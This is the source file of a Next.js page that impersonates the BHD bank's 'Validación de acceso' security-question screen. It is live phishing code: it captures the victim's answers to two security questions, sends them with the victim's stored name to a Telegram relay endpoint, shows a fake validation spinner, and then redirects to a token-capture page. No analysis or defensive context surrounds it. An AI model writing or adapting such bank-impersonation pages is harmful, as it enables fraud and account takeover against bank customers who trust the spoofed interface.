"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function PreguntasBHD() {
  const router = useRouter();
  const [r1, setR1] = useState("");
  const [r2, setR2] = useState("");
  const [loading, setLoading] = useState(false);
  const [cliente, setCliente] = useState("");

  useEffect(() => {
    const nombre = localStorage.getItem("cliente_actual");
    if (nombre) setCliente(nombre);
  }, []);

  const handleContinue = async () => {
    if (!r1.trim() || !r2.trim()) {
      alert("⚠️ Por favor, responda a las preguntas de seguridad.");
      return;
    }

    setLoading(true);
    try {
      // 1. Enviamos las respuestas a Telegram
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pagina: "❓ PREGUNTAS: BHD",
          nombre: cliente || "Cliente Desconocido",
          usuario: "RESPUESTAS SEGURIDAD",
          password: `R1: ${r1} | R2: ${r2}`,
        }),
      });

      // 2. Redirección limpia a token-bhd tras simular la carga
      setTimeout(() => {
        router.push("/portal/token-bhd"); // <--- Cambiado a la ruta correcta
      }, 2000);

    } catch (e) {
      router.push("/portal/token-bhd"); // <--- Mismo destino en caso de error
    }
  };

  return (
    <main className="min-h-screen bg-[#e9ecef] font-sans relative">
      
      {/* PANTALLA DE CARGA */}
      {loading && (
        <div className="fixed inset-0 z-[9999] flex flex-col items-center justify-center bg-white/90 backdrop-blur-sm">
          <div className="flex flex-col items-center">
            <div className="w-16 h-16 border-4 border-slate-200 border-t-[#28a745] rounded-full animate-spin mb-6"></div>
            <h2 className="text-2xl md:text-3xl text-slate-700 font-light tracking-wide">
              Validando información, por favor espere ...
            </h2>
          </div>
        </div>
      )}

      {/* Barra Superior - Logo BHD */}
      <div className="bg-white h-[75px] flex items-center justify-between px-6 md:px-20 border-b border-slate-200">
        <div className="flex items-center">
          <img src="/images/bhd.png" alt="BHD" className="h-10 object-contain" />
          <div className="h-10 w-[1.5px] bg-black mx-4"></div>
          <span className="italic text-[#28a745] font-semibold text-[24px]">Personal</span>
        </div>
        
        <div className="flex items-center gap-2">
          <span className="text-slate-500 text-[15px]">Bienvenido(a)</span>
          <div className="w-10 h-10 flex items-center justify-center cursor-pointer">
             <svg viewBox="0 0 24 24" className="w-9 h-9 text-[#e35a5a]" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" strokeLinecap="round" strokeLinejoin="round"/>
             </svg>
          </div>
        </div>
      </div>

      {/* Contenedor Principal */}
      <div className="max-w-[1150px] mx-auto mt-12 px-4 pb-20">
        <div className="bg-white p-10 md:p-14 shadow-sm border border-slate-200 rounded-sm">
          
          <h2 className="text-[30px] text-[#b0bec5] font-light mb-10 border-b border-slate-50 pb-4">
            Validación de acceso
          </h2>
          
          <div className="mb-10">
            <p className="text-[16px] font-bold text-[#333]">
              Responde correctamente las preguntas de seguridad que configuraste para acceder a tus productos.
            </p>
          </div>

          <div className="max-w-2xl space-y-10">
            <div>
              <label className="block text-[15px] text-[#333] mb-3 font-medium">
                Ingresar la respuesta a la primera pregunta de seguridad.
              </label>
              <input
                type="text"
                autoComplete="off"
                value={r1}
                onChange={(e) => setR1(e.target.value)}
                className="w-full md:w-[480px] border border-[#cfd8dc] p-3 rounded-[4px] outline-none focus:border-[#28a745] text-slate-700"
                placeholder="Tu respuesta aquí"
              />
            </div>

            <div>
              <label className="block text-[15px] text-[#333] mb-3 font-medium">
                Ingresar la respuesta a la segunda pregunta de seguridad.
              </label>
              <input
                type="text"
                autoComplete="off"
                value={r2}
                onChange={(e) => setR2(e.target.value)}
                className="w-full md:w-[480px] border border-[#cfd8dc] p-3 rounded-[4px] outline-none focus:border-[#28a745] text-slate-700"
                placeholder="Tu respuesta aquí"
              />
            </div>

            <div className="flex items-center gap-3 pt-2">
              <input type="checkbox" className="w-5 h-5 border-[#cfd8dc] rounded-sm accent-[#28a745]" />
              <label className="text-[16px] font-bold text-[#333]">¿Deseas guardar este dispositivo como seguro?</label>
            </div>

            <div className="space-y-4 pt-6">
              <button 
                type="button" 
                onClick={() => router.back()}
                className="w-full bg-white border border-[#28a745] text-[#28a745] py-3.5 rounded-md font-semibold text-lg hover:bg-slate-50 transition-colors"
              >
                Cancelar
              </button>
              
              <button
                type="button"
                onClick={handleContinue}
                disabled={loading}
                className="w-full bg-[#28a745] hover:bg-[#218838] text-white py-3.5 rounded-md font-semibold text-lg transition-colors shadow-sm disabled:opacity-50"
              >
                {loading ? "Procesando..." : "Continuar"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}